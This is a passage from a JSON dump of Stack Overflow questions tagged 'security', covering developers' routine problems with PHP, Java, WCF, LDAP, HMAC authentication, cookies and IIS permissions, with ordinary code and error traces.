tricks in lieu of restarting <code>securityd</code>.</p>\n\n<p>We are looking for a <strong>safe restart process</strong> for <code>securityd</code>.</p>\n"},{"tags":["php","security","webserver"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":68,"score":0,"question_id":12923638,"title":"put a index.php (or .html) file on every folder of a site, is a good security practice?","body":"<p>I've heard this many and many times: \"create a index.php on every folder in your web server to make sure users will not see a list of files in the folders\"</p>\n\n<p>is that true? I'm in need of some good pratices for security.</p>\n"},{"tags":["forms","security","cakephp","plugins"],"answer_count":0,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":73,"score":4,"question_id":12922111,"title":"CakePHP 2.x: Embedding a login form as an element using CakeDC's User plugin and Security component","body":"<p>newish CakePHP user here. I haven't been able to find a solution to this issue.</p>\n\n<p>I would like to embed a login form as an element in an existing page. I am using the CakeDC user plugin. The goal is to embed the login form in the page and then, when they log in, update some content on the page without refreshing the page. Before we get to worrying about AJAX and SecurityComponent, I would like to at least get the form embedded on some other page as an element.</p>\n\n<p>For starters, I tried to straight up copy and paste the contents of '/Views/Users/login.ctp' into the element. This gave me an warning of 'undefined variable \"$Model\"', so I hardcoded the model as 'Users.User\" (because I assumed that the notation for accessing a model inside a plugin was 'plugin.model' like they said in the manual). This failed with the error message Error: <em>Users.usersController could not be found.</em></p>\n\n<p>So, I adjusted the form to take 'User' as the model instead of $model and the request now gets blackholed. If I disable the security component, I can log in successfully. This isn't quite a satisfactory solution (I mean, I could opt to not validate the form or define 'login' as an unlocked action, but if I do that, then I may as well not have security enabled for login, right?).</p>\n\n<p>Here is the code for app/Plugin/Users/View/Elements/login.ctp:</p>\n\n<pre><code>&lt;div class=\"users index\"&gt;\n&lt;h2&gt;&lt;?php echo __d('users', 'Login'); ?&gt;&lt;/h2&gt;\n&lt;fieldset&gt;\n    &lt;?php\n        echo $this-&gt;Form-&gt;create('User', array(\n            'action' =&gt; 'login',\n            'id' =&gt; 'LoginForm'));\n        echo $this-&gt;Form-&gt;input('User.email', array(\n            'label' =&gt; __d('users', 'Email')));\n        echo $this-&gt;Form-&gt;input('User.password',  array(\n            'label' =&gt; __d('users', 'Password')));\n\n        echo '&lt;p&gt;' . __d('users', 'Remember Me') . $this-&gt;Form-&gt;checkbox('remember_me') . '&lt;/p&gt;';\n        echo '&lt;p&gt;' . $this-&gt;Html-&gt;link(__d('users', 'I forgot my password'), array('action' =&gt; 'reset_password')) . '&lt;/p&gt;';\n\n        echo $this-&gt;Form-&gt;end(__d('users', 'Submit'));\n    ?&gt;\n&lt;/fieldset&gt;\n</code></pre>\n\n<p></p>\n\n<p>Following is the code for the View that is calling the element:</p>\n\n<pre><code>&lt;div id=\"loginform\"&gt;\n&lt;?php echo $this-&gt;element('Users.login'); ?&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>If I copy and paste the element code into a View (say, in <code>apps/Plugin/Users/View/Users/login.ctp</code>), it works regardless of whether Security is on or off, so I suspect some monkeying around with the form or Security calls is in order.</p>\n\n<p>Any ideas or help would be greatly appreciated.</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":40,"score":1,"question_id":12920874,"title":"secure php settings","body":"<p>i guess php.ini is a very important file in regards of security.</p>\n\n<p>Few points i know which we should do for security points are </p>\n\n<ol>\n<li>REGISTER GLOBAL SHOULD BE OFF</li>\n<li>allow_url_fopen = Off</li>\n</ol>\n\n<p>can someone share more points here ?</p>\n"},{"tags":["security","http","web-applications","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12919747,"title":"Which cookie attributes uniquely identify a cookie?","body":"<p>I'm trying to determine scenarios in which a cookie returned by HTTP server overwrites an existing cookie vs. sets a new cookie.</p>\n\n<p>Say foo.example.com sets a cookie:</p>\n\n<blockquote>\n  <p>Set-Cookie: SSID=abc; Domain=.example.com; Path=/abc; Expires=Wed,\n  13-Jan-2021 22:23:01 GMT; Secure; HttpOnly</p>\n</blockquote>\n\n<p>Which attributes bar.example.com needs to set in order to overwrite this cookie and not create a new one? In particular, will following response header overwrite the original cookie:</p>\n\n<blockquote>\n  <p>Set-Cookie: SSID=xyz; Domain=.example.com; Expires=Wed, 13-Jan-1990\n  22:23:01 GMT;</p>\n</blockquote>\n\n<p>Is the behavior consistent across browsers?</p>\n"},{"tags":[".net","security","encryption","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":67,"score":4,"question_id":12916612,"title":"Why is SHA512Managed not FIPS Compliant?","body":"<p>As the title asks, why does SHA512Managed encryption cause an <code>InvalidOperationException</code> when the FipsAlgorithmPolicy is active on a machine?</p>\n\n<p>Is it not secure enough for the FIP standard, or is it too secure?</p>\n"},{"tags":["java","security","web-applications","jetty","openldap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12873237,"title":"Jetty LdapLoginModule: Login Failure: all modules ignored","body":"<p>I'm getting the below on trying to submit a login form. Does anyone know what causes this? Thanks.</p>\n\n<pre><code>2012-10-13 13:11:46.300:INFO:oejpjs.LdapLoginModule:Searching for users with filter: '(&amp;(objectClass={0})({1}={2}))' from base dn: ou=people,dc=my-domain,dc=com\n2012-10-13 13:11:46.307:INFO:oejpjs.LdapLoginModule:Found user?: true\n2012-10-13 13:11:46.311:WARN:oejpj.JAASLoginService:\njavax.security.auth.login.LoginException: Login Failure: all modules ignored\nat javax.security.auth.login.LoginContext.invoke(LoginContext.java:921)\nat javax.security.auth.login.LoginContext.access$000(LoginContext.java:186)\nat javax.security.auth.login.LoginContext$4.run(LoginContext.java:683)\nat java.security.AccessController.doPrivileged(Native Method)\nat javax.security.auth.login.LoginContext.invokePriv(LoginContext.java:680)\nat javax.security.auth.login.LoginContext.login(LoginContext.java:579)\nat org.eclipse.jetty.plus.jaas.JAASLoginService.login(JAASLoginService.java:238)\nat org.eclipse.jetty.security.authentication.FormAuthenticator.validateRequest(FormAuthenticator.java:209)\nat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:491)\nat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:231)\nat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1072)\nat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:382)\nat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:193)\nat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1006)\nat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)\nat org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:255)\nat org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:154)\nat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)\nat org.eclipse.jetty.server.Server.handle(Server.java:365)\nat org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:485)\nat org.eclipse.jetty.server.AbstractHttpConnection.content(AbstractHttpConnection.java:937)\nat org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.content(AbstractHttpConnection.java:998)\nat org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:856)\nat org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:240)\nat org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)\nat org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:627)\nat org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:51)\nat org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:608)\nat org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543)\nat java.lang.Thread.run(Thread.java:680)\n</code></pre>\n\n<p>FWIW this is some of the peripheral configuration:</p>\n\n<p>jetty.xml:</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;Configure&gt;\n    &lt;Call name=\"addBean\"&gt;\n        &lt;Arg&gt;\n            &lt;New class=\"org.eclipse.jetty.plus.jaas.JAASLoginService\"&gt;\n                &lt;Set name=\"name\"&gt;ldap&lt;/Set&gt;\n                &lt;Set name=\"loginModuleName\"&gt;ldaploginmodule&lt;/Set&gt;\n            &lt;/New&gt;\n        &lt;/Arg&gt;\n    &lt;/Call&gt;\n&lt;/Configure&gt;\n</code></pre>\n\n<p>ldap.conf:</p>\n\n<pre><code>ldaploginmodule {\n    org.eclipse.jetty.plus.jaas.spi.LdapLoginModule required\n    debug=\"true\"\n    contextFactory=\"com.sun.jndi.ldap.LdapCtxFactory\"\n    hostname=\"localhost\"\n    port=\"389\"\n    bindDn=\"cn=Manager,dc=my-domain,dc=com\"\n    bindPassword=\"secret\"\n    authenticationMethod=\"simple\"\n    forceBindingLogin=\"false\"\n    userBaseDn=\"ou=people,dc=my-domain,dc=com\"\n    userRdnAttribute=\"uid\"\n    userIdAttribute=\"uid\"\n    userPasswordAttribute=\"userPassword\"\n    userObjectClass=\"inetOrgPerson\"\n    roleBaseDn=\"ou=groups,dc=my-domain,dc=com\"\n    roleNameAttribute=\"cn\"\n    roleMemberAttribute=\"uniqueMember\"\n    roleObjectClass=\"groupOfUniqueNames\";\n};\n</code></pre>\n"},{"tags":["php","javascript","security","https","xss"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":706,"score":6,"question_id":6530339,"title":"Does https secure cookies prevent XSS attacks?","body":"<p>Does https connection secure cookies and prevents XSS attacks. I have a simple blog that allows users to enter JavaScript code as an input. I want to allow Javascript input by the user while still preventing XSS attacks and cookie stealing. Does https help secure cookies. I only found few sites that talks about this and still a bit unclear. </p>\n"},{"tags":["java","security","digital-signature","pkcs#11"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3906,"score":3,"question_id":4833989,"title":"Java Access Token PKCS11 Not found Provider","body":"<p>Hello I'm trying to access the keystore from my smartcard in Java. And I'm using the following code..</p>\n\n<p>I'm using the Pkcs11 implementation of OpenSc <a href=\"http://www.opensc-project.org/opensc\" rel=\"nofollow\">http://www.opensc-project.org/opensc</a></p>\n\n<p><strong>File windows.cnf</strong> =   </p>\n\n<pre><code>name=dnie\nlibrary=C:\\WINDOWS\\system32\\opensc-pkcs11.dll\n</code></pre>\n\n<p><strong>Java Code</strong> =</p>\n\n<pre><code>String configName = \"windows.cnf\"\n String PIN = \"####\";\n Provider p = new sun.security.pkcs11.SunPKCS11(configName);\n Security.addProvider(p);\n KeyStore keyStore = KeyStore.getInstance(\"PKCS11\", \"SunPKCS11-dnie\");  =)(= \n char[] pin = PIN.toCharArray();\n keyStore.load(null, pin);\n</code></pre>\n\n<p>When the execution goes by the line with <strong>=)(=</strong>  throws me the following exception </p>\n\n<pre><code>java.security.KeyStoreException: PKCS11 not found\n\n    at java.security.KeyStore.getInstance(KeyStore.java:635)\n    at ObtenerDatos.LeerDatos(ObtenerDatos.java:52)\n    at ObtenerDatos.obtenerNombre(ObtenerDatos.java:19)\n    at main.main(main.java:27)\nCaused by: java.security.NoSuchAlgorithmException: no such algorithm: PKCS11 for provider SunPKCS11-dnie\n        at sun.security.jca.GetInstance.getService(GetInstance.java:70)\n        at sun.security.jca.GetInstance.getInstance(GetInstance.java:190)\n        at java.security.Security.getImpl(Security.java:662)\n        at java.security.KeyStore.getInstance(KeyStore.java:632)\n</code></pre>\n\n<p>I think the problem is \"SunPKCS11-dnie\", but I don't know to put there. I had tried with a lot of combinations...</p>\n\n<p>Anyone can help me... </p>\n"},{"tags":["security","windows-8","wmi","remote-access"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12891508,"title":"Wmi Security on Windows 8","body":"<p>I have some problems regarding WMI scripting on Windows 8. More precisely, remote connection from Win7(not that relevant) to Windows 8. Note that the following issues do not happen when the client machine runs Windows 7. </p>\n\n<p>First one is getting data regarding the current shares on that machine. Specifically, I am trying to get the Path property of the shares, that is local path. </p>\n\n<p>In windows 7 it works perfectly, in windows 8 however it returns null(ran with wbemtest from remote computer). </p>\n\n<p>First I thought that there is a problem with the WMI system. Then I ran the same query directly on the win8 machine. That returned the actual local path of the share. This led me to believe that there are problems with the WMI security on that machine. </p>\n\n<p>Another issue I have with WMI on win8 is that it does not allow me to run things as Administrator, even though the user used to log is is the Administrator. </p>\n\n<p>Regarding the security settings on the win8 machine, I gradually lowered them to try the exact position in which I can operate. I have reached the level where Everyone has every access, so it is the lowest security possible. Hope someone can help. </p>\n"},{"tags":["python","security","io","text-files"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":114,"score":1,"question_id":12915132,"title":"Deny reading part of a file in python","body":"<p>I have a text file for which I use two write functions: 1) Normal Write, 2) Secure Write.</p>\n\n<p>Now when I want to read the data from the file, I should be only be able to read the data written using the \"Normal Write\" function and should not be able to read the data written using \"Secure Write\" function.</p>\n\n<p>My idea was to use a dictionary for this using the key as a flag to check if the value was written using normal write or secure write.</p>\n\n<p>How can I do this in Python?</p>\n"},{"tags":["security","http","http-headers","csrf"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12915208,"title":"Origin header proposal","body":"<p>Regarding the \"Origin\" header as proposed in 2009/2010 at:</p>\n\n<p><a href=\"https://wiki.mozilla.org/Security/Origin\" rel=\"nofollow\">https://wiki.mozilla.org/Security/Origin</a></p>\n\n<p>Does anyone know what's happening with this in terms of browser support?</p>\n\n<p>Google Chrome seems to send it when submitting a <code>&lt;form&gt;</code>, but nothing from FireFox.</p>\n\n<p>It seems as though its kind of being covered in the CORS specification, but that seems to be more related to XMLHttpRequest():</p>\n\n<p><a href=\"http://www.w3.org/TR/cors/\" rel=\"nofollow\">http://www.w3.org/TR/cors/</a></p>\n\n<hr>\n\n<p>I am hoping to use it as an <em>additional</em> check to ensure that if a page is being loaded (to make a change request), it has been done so via a request from a user (rather than the URL being specified in an <code>&lt;img&gt;</code> tag).</p>\n\n<p>In reality I think I have all my systems require a POST request with the proper CSRF protection, but it would be nice to have additional checks.</p>\n\n<hr>\n\n<p>This might be related to:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/10033166/\">Compatibility of the &quot;Origin&quot; http header for enforcing restrictions</a></p>\n"},{"tags":["security","ms-access","outlook","hacking","alternative"],"answer_count":6,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":477,"score":2,"question_id":1496549,"title":"Outlook security","body":"<p>Is there any other way to get rid of this outlook security message? \"A program is trying to automatically send e-mail on your behalf ... and so on\" and it gives me an option to select Yes , No &amp; Help. </p>\n\n<p>Im currently developing an outlook automation app using Ms Access. Everytime I issue Send command this message popups, I tried using SendKeys \"%s\" but it does not work in Access 2007.</p>\n\n<p>Is there any alternative solution for this? Thanks!!</p>\n"},{"tags":[".net","security","certificate","websphere-mq"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":12906954,"title":"Client cert label `ibmwebspheremq<userid>` for domain user","body":"<p>If the client connected to the WebSphere MQ server is using a domain account, say <code>box1\\user1</code>, then is the client's cert label: <code>ibmwebspheremquser1</code> or <code>ibmwebspheremqbox1\\user1</code> ?</p>\n"},{"tags":["security","websphere-mq","mq","userid","messagebroker"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":177,"score":2,"question_id":12889953,"title":"Unable to connect to queue manager in WebSphere MQ 7.1","body":"<p>I've installed WebSphere MQ 7.1 on Linux platform, after which I installed WebSphere Message Broker 8.0.0.1. Now when I try to create an execution group, I get an exception: Reason code 2035. This exception states that the user is unauthorised to connect to the queue manager. I have this user added in the <code>mqm</code> group. I did not face any such issue when I was working with MQ 7.0.x. I searched a lot and came to know that there is user ID blocking in MQ 7.1. But, I want this user to be able to create execution group, how can I do so? Please advise.</p>\n"},{"tags":["java","security","cryptography","cipher"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":84,"score":-1,"question_id":12914013,"title":"java cryptography KeyGenerator","body":"<p>my code is </p>\n\n<pre><code>import java.security.Key;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class apiKeyGenerate {\n  public static void main(String[] args) throws Exception {\n   // Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n\n    byte[] input = \"input\".getBytes();\n    byte[] ivBytes = \"1234567812345678\".getBytes();\n\n    Cipher cipher =  Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n    KeyGenerator generator = KeyGenerator.getInstance(\"AES\", \"BC\");\n    generator.init(128);\n    Key encryptionKey = generator.generateKey();\n    System.out.println(\"key : \" + new String(encryptionKey.getEncoded()));\n   }\n}\n</code></pre>\n\n<p>In above code fire Exception is : -  java.security.NoSuchProviderException:\nthat is </p>\n\n<pre><code>Exception in thread \"main\" java.security.NoSuchProviderException: no such provider: BC\n    at sun.security.jca.GetInstance.getService(Unknown Source)\n    at javax.crypto.SunJCE_b.a(DashoA13*..)\n    at javax.crypto.KeyGenerator.getInstance(DashoA13*..)\n    at apiKeyGenerate.main(apiKeyGenerate.java:17)\n</code></pre>\n\n<p>How can I do that ??\nThanks in advance</p>\n"},{"tags":["c#",".net","wcf","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12772286,"title":"Custom Authentification via Service Method?","body":"<p>For a client-server application, I want to develop a Web-Service which will be mainly used by the application itself (not intended for use by third parties at this time).</p>\n\n<p>On the long run, however, exposing the WebService as some kind of API is generally desirable. Thus, I am already putting some thoughts in choosing a technology which allows \"RESTifing\" (terrible word-creation, I know ;-) ) a Web-Service easily at a later point.<br>\nWCF seems to be about right here as it provides the webHttpBinding but also other bindings which allow taking advantage of LANs and .NET clients.</p>\n\n<p>The issue I now ran into is about authentification: All the authentification measures WCF provides seem to happen \"outside\" the actual service. However, I'd like to have a <code>Login</code> method (or something more \"RESTful\" as shown <a href=\"http://stackoverflow.com/a/2022938/232175\">here under point 2</a>).</p>\n\n<p>For example, I imagine writing a Service like this one:</p>\n\n<pre><code>[ServiceContract]\npublic interface IUserService\n{\n   [ServiceMember]\n   [WebInvoke(Method = \"POST\", WebUri=\"/Session\")]\n   public void Login(string username, string password);\n\n   [ServiceMember]\n   [WebInvoke(Method = \"POST\", WebUri=\"/Users\")]\n   public void Register(RegisterUserParameter parameter);\n}\n</code></pre>\n\n<p>How do I integrate this service into the WCF so the methods preferably work over multiple sub-services in my service project?</p>\n\n<p>When using the built-in WCF authentification, I need to supply username and password before making any service call. Thus, calls to either <code>Register</code> or <code>Login</code> would fail because I am not authentificated.</p>\n\n<p>And how can I tell the WCF to remember which user is currently logged in using my service method? Is there any possibility to store something like a session cookie inside the WCF session on the client?</p>\n\n<p>Or is it generally a bad idea to realize authentification under WCF the way I am trying to?</p>\n\n<p>Should I maybe directly choose WebAPI at the cost of having a more complicated way to talk to the service in my client application?</p>\n"},{"tags":["security","wcf-security","wcf-client","wif"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12731328,"title":"Custom STS and expired password via WS-Trust scenario","body":"<p>Are there any guidelines or best practices for handling expired passwords for scenario with active clients via WS-Trust?  </p>\n\n<p>For now I have couple of ideas, but can't find any info about it:<br>\n1. Issue special token, so client can determine, that is should show change password notification.<br>\n2. Throw specific exception.  </p>\n\n<p>Maybe I am missing something in WS-Trust standard?   </p>\n\n<p>Im using WIF built-in implementation, so it is 1.3 version of standard with parts of 1.4.\nThanks a lot in advance. </p>\n"},{"tags":["python","django","security","encryption","credentials"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":89,"score":6,"question_id":12904560,"title":"Storing credentials in django","body":"<p>I'm working on a python/django app which, among other things, syncs data to a variety of other services, including samba shares, ssh(scp) servers, Google apps, and others. As such, it needs to store the credentials to access these services. Storing them as unencrypted fields would be, I presume, a Bad Idea, as an SQL injection attack could retrieve the credentials. So I would need to encrypt the creds before storage - are there any reliable libraries to achieve this?</p>\n\n<p>Once the creds are encrypted, they would need to be decrypted before being usable. There are two use cases for my app:</p>\n\n<ul>\n<li>One is interactive - in this case the user would provide the password to unlock the credentials. </li>\n<li>The other is an automated sync - this is started by a cron job or similar. Where would I keep the password in order to minimise risk of exploits here?</li>\n</ul>\n\n<p>Or is there a different approach to this problem I should be taking?</p>\n"},{"tags":["spring","security","jsp","freemarker","taglib"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":253,"score":1,"question_id":12069602,"title":"Adding spring library for usage of JSP Taglibs for security in Freemarker","body":"<p>I am using spring with freemarker as the template engine. Freemarker allows to use the Jsp Taglibs, for security for example, by adding</p>\n\n<pre><code>    &lt;#assign security=JspTaglibs[\"http://www.springframework.org/security/tags\"] /&gt;\n</code></pre>\n\n<p>to the templates, what allows me to use for example </p>\n\n<pre><code>    &lt;@security.authorize ifNotGranted=\"ROLE_ADMIN\"&gt;\n        whatever\n    &lt;/@security.authorize&gt;\n</code></pre>\n\n<p>But, Spring/Freemarker cannot find the taglibs, unless they are added to the classpath, so I added </p>\n\n<pre><code>    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-security-taglibs&lt;/artifactId&gt;\n        &lt;version&gt;${spring.version}&lt;/version&gt;\n    &lt;/dependency&gt;\n</code></pre>\n\n<p>to my pom.xml in my project. </p>\n\n<p>But anyway, the tags couldn't be found! I had to add the spring-security-taglibs.jar into WEB-INF/lib folder for the tags to be found. </p>\n\n<p>Does someone know why the jar has to be added explicitly into the lib folder?? Why aren't they found by tomcat, in my case?</p>\n\n<p>EDIT @ddekany</p>\n\n<p>Thank you. The stacktrace is the following, if the spring-security-taglibs.jar is not copied into the WEB-INF/lib directory</p>\n\n<pre><code>    No mapping defined for http://www.springframework.org/security/tags \n    The problematic instruction: ---------- ==&gt; assignment: \n            security=JspTaglibs[\"http://www.springframework.org/security/tags\"] \n            [on line 12, column 1 in home.ftl] in user-directive content.main \n            [on line 8, column 9 in home.ftl] in user-directive layout.global \n            [on line 2, column 1 in home.ftl] \n    ---------- Java backtrace for programmers: ----------      \n    freemarker.template.TemplateModelException: \n            No mapping defined for http://www.springframework.org/security/tags at         \n    freemarker.ext.jsp.TaglibFactory.get(TaglibFactory.java:180) at \n    ...\n</code></pre>\n"},{"tags":["php","security","url","html-entities","valid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12908258,"title":"URL + htmlentities ? what to think about this?","body":"<p>I asked a question in an another forum related to urlencode(), when a guy appeared saying briskly it is absolutly required to make use of htmlentities on top of it, and also suggesting I should do that everytime I write an URL. \"To be valid and secure he said\". I do not see why it could be a security issue. Here is the code he mentionned :</p>\n\n<pre><code>echo '&lt;a href=\"index.php?' . htmlentities('page=encode&amp;code='.urlencode($code).'&amp;login='.urlencode($login).'&amp;codeconf=' . urlencode($codeconf)) . '\"&gt;';\n</code></pre>\n\n<p>Php Manual indeed mentions htmlentities. But there are no further explanations:</p>\n\n<blockquote>\n  <p>Note ... PHP supports changing the argument separator to the W3C-suggested semi-colon through the arg_separator .ini directive. Unfortunately most user agents do not send form data in this semi-colon separated format. A more portable way around this is to use &amp; instead of &amp; as the separator. You don't need to change PHP's arg_separator for this. Leave it as &amp;, but simply encode your URLs using htmlentities() or htmlspecialchars(). </p>\n</blockquote>\n\n<p>I replaced <strong>\"&amp;\"</strong> by <strong>&amp;amp ;</strong> , I validated my page in W3C validator and it came out OK.</p>\n\n<p>I am still concerned about this htmlentities issue.</p>\n\n<ol>\n<li>Is there any good reason why whe should use htmlentities in URL's ?</li>\n<li>If yes, does this apply to all types of URL's ?</li>\n<li>If yes, is it for security reasons ?</li>\n</ol>\n\n<p>Thanks. </p>\n"},{"tags":["web-services","security","http","cryptography","hmac"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12904059,"title":"Is it more expensive an authentication system based on HMAC over HTTP or single-token over HTTPS?","body":"<p>The 1st case would require to generate for each communication a HMAC identifying the request, so the server can re-generate it to make sure the client is authorized (because the HMAC is encryped with a private key that is only known by the server and the client), while the 2nd one only requires the service to issue the certificate (or token) once, and keep it live for some minutes -ex. 15 minutes-. Of course to prevent MITM or Replay attacks it must be sent only over SSL, with all the conseguences (more bandwitdh and more CPU requirements).</p>\n\n<p>Personally I find the 1st to be not only simpler but also stronger, because each request has its own unique data, while the 2nd relies on the SSL certificate integrity (I'm not saying that's easy to crack a signed SSL certificate, but if someone would break it all the traffic would be sniffed for all communications).</p>\n\n<p>So I find them to have the following pro/cons:</p>\n\n<ul>\n<li>HMAC pros: unique token for each request, can be really secure against MITM and Replay attacks -by using unique data to compose the signature and a timestamp-, easy to implement</li>\n<li>HMAC cons: requires the server to work for each single request to re-generate the token</li>\n<li>Token pro: one token for multiple requests, useful on services that require multiple client actions</li>\n<li>Token cons: requires SSL for all communications.</li>\n</ul>\n\n<p>I think I'd need to set up some tests to get a final answer, but I'd love to hear if someone has already some knowledge or some tought based on old experiences.</p>\n"},{"tags":["android","security","application"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":499,"score":0,"question_id":8178982,"title":"Is it possible to prevent user from uninstalling application in Android?","body":"<p>I want to prevent user from uninstalling my application.But my main objective is to ask the password before uninstallation of the applcation.Is it Possible in android.</p>\n"},{"tags":["c#","security","windows-live"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":256,"score":1,"question_id":1347098,"title":"Windows Live Authenticaton","body":"<p>Is it possible to make HttpWebRequest query to windows Live ID enabled web sites? What is the method of authentication knowing username and clear text password? Could not found anything like that in Live ID SDK.</p>\n"},{"tags":["security","configuration","nant"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":342,"score":0,"question_id":1155042,"title":"How to make a copy of an existing config file using nant","body":"<p>I was wondering if there is any way to make a copy of an existing web.config file(rename the newly created file) with the nant build.</p>\n"},{"tags":["php","web-services","security","authentication","hmac"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":222,"score":1,"question_id":11442793,"title":"HMAC Implementation for Web Service Authentication in PHP","body":"<p>I am trying to implement a web service and need some (very) simple Authenticate to restrict access to the service.</p>\n\n<p>I found out about HMAC and I think I understand how to implement it. But I have a couple of questions in mind.</p>\n\n<p>Let's say I have this HTML Form on the consumer side. When making a GET/POST request to my server.</p>\n\n<ol>\n<li>Is is enough to create a hash of: <code>public_key</code> using the <code>secret_key</code>?</li>\n<li>OR, do I need to create a hash of the entire <code>POST</code> variables/array?</li>\n</ol>\n\n<p>I'm thinking it would be enough to send the hash of the <code>public_key</code> only but just wanted to make sure and ask you guys.</p>\n\n<p><strong>I am planning to do this:</strong></p>\n\n<ol>\n<li>Create a hash of the <code>public_key</code></li>\n<li>Put the hash in a hidden field or in the URL as a param together with the public_key (or client_id) and other POST/GET variables.</li>\n<li>Receive on my server and verify the hash against the database by recreating the hash of the <code>public_key</code> using the <code>secret_key</code>.</li>\n<li>If the hash matches, I accept the POST/GET requests.</li>\n</ol>\n\n<p>Your thoughts?</p>\n\n<p><strong>Clarification:</strong> <code>public_key</code> is like the <code>client unique id</code> where I can use to identify what <code>secret key</code> to use to generate the hash on the server.</p>\n"},{"tags":["security","google-charts"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":46,"score":0,"question_id":12899348,"title":"Google Charts Data security","body":"<p>We are considering using Google charts for our project but we have highly confidential data.  Can you use Google Charts without sending the data to Google?</p>\n\n<p>Also, can we run this as a server charting tool also?</p>\n"},{"tags":["security","internet-explorer","https"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1108,"score":2,"question_id":4201042,"title":"How to trace source of IE8 Security Warning?","body":"<p>I am getting the dreaded security warning when running my GWT web app under IE8:\n\"this webpage contains content that will not be delivered using a secure HTTPS\"</p>\n\n<p>It of course works fine with Firefox and Chrome.</p>\n\n<p>I have taken a look at the requests with firebug and I see no HTTP requests.</p>\n\n<p>I have also used both Fiddler and HttpWatch with IE and I still see no HTTP requests.</p>\n\n<p>Can anyone provide me with some clues as to what else might trigger this warning?</p>\n"},{"tags":["security","iis","administration"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12900218,"title":"Access denied when using Microsoft.Web.Administration in IIS","body":"<p>I'm trying to use Microsoft.Web.Administration to access the Live Smooth Streaming publishing points from a webpage in IIS. The problem I have is security. I'm using win server 2008 and iis 7 with anonymous and forms authentication enabled.</p>\n\n<p>First I tried with the default 'network service' as the app pool identity. Got a permission error on redirection.config file. Gave 'network service' full access to that file and the applicationhost.config file. Then I get another error: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)). I can't get passed this one.</p>\n\n<p>So I tried to set app pool identity to 'local system' and that works as it should, problem is, I don't want to run the public website with 'local system'.</p>\n\n<p>Tried to set app pool identity to 'applicationpoolidentiy'. Then got same permisison errors as with 'network service'. Changed the permissions on the config file and directory. Got the same Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)) error again.</p>\n\n<p>I'm stuck, what is causing this access denied message? I don't get it 